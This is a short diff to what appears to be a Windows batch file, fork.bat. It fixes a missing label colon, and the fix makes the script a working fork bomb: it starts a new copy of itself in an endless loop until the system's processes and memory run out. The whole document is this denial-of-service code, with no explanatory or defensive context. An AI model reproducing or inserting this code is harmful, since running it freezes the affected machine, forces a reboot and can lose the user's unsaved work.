@@ -1,3 +1,3 @@
-loop
+:loop
 start fork.bat
 goto loop
